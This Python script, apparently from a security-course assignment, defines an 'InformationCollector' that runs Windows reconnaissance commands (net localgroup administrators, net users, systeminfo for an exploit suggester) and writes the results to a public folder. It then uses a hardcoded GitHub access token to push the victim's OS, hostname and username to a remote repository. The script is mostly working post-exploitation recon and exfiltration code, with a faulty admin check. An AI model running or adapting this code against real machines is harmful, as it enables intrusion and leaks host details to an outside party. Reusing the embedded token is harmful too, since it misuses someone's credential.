class InformationCollector():
    def __init__(self, script_name):
        self.script_name = script_name
    
    def create_log(self,script_name,status):
        '''This function will create a log (succes/failed) depending on the script's results'''
        import socket
        import platform
        import base64
        import getpass
        import datetime
        from github import Github
        import datetime
        ACCESS_TOKEN ='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'
        FOLDER_PATH ='logs'
        current_datetime = datetime.datetime.now()
        content = f"Script Name: {script_name}\nExecution time: {current_datetime}\nStatus: {status}\n\n"
        username = getpass.getuser()
        hostname = socket.gethostname()
        os_name = platform.system()
        filename = os_name + "_" + hostname + "_" + username
        g = Github(ACCESS_TOKEN)
        repo = g.get_repo("rsecurity12/python_opdracht")
        
        try:
            existing_file = repo.get_contents(f"{FOLDER_PATH}/{filename}")
            sha = existing_file.sha
            existing_content = base64.b64decode(existing_file.content).decode()
            new_content = existing_content + '\n' + content
            repo.update_file(existing_file.path, "Update log", new_content, sha)
        except Exception as e:
            if 'Not Found' in str(e):
                new_file = repo.create_file(f"{FOLDER_PATH}/{filename}", "New log", content)
            else:
                pass

        
    def run(self):
        '''This function performs a basic information gathering '''
        import ctypes
        import subprocess
        import os
        output_file = r"C:\Users\Public\gather_info.txt"
        screenshot_path = r"C:\Users\Public\gather_info"
        if not os.path.exists(screenshot_path):
            os.makedirs(screenshot_path)   
        output_file = open(r"C:\Users\Public\gather_info\windows_info.txt", "w")      
        gather_admin_result = subprocess.run(["net", "localgroup", "administrators"], capture_output=True, text=True)
        gather_user_result = subprocess.run(["net", "users"], capture_output=True, text=True)
        systeminfo = subprocess.run(['systeminfo'], capture_output=True, text=True)
        try:
            ctypes.windll.shell32.IsUserAnAdmin() != 0
            output_file.write("Administrative privileges:\nUser has administrative privileges\n\n")
        except:
            output_file.write("Administrative privileges:\nUser does not have administrative privileges\n\n")   
        output_file.write(f"Admin group:\n{gather_admin_result.stdout}\n\n")    
        output_file.write(f"Users in the target:{gather_user_result.stdout}\n\n") 
        output_file.write(f"Systeminfo output for suggester:\n{systeminfo.stdout}")
        output_file.close()
      
info = InformationCollector("information Collector")
info.run()

try:
    info.run()
    info.create_log(info.script_name,"success")
except:
    info.create_log(info.script_name,"failed")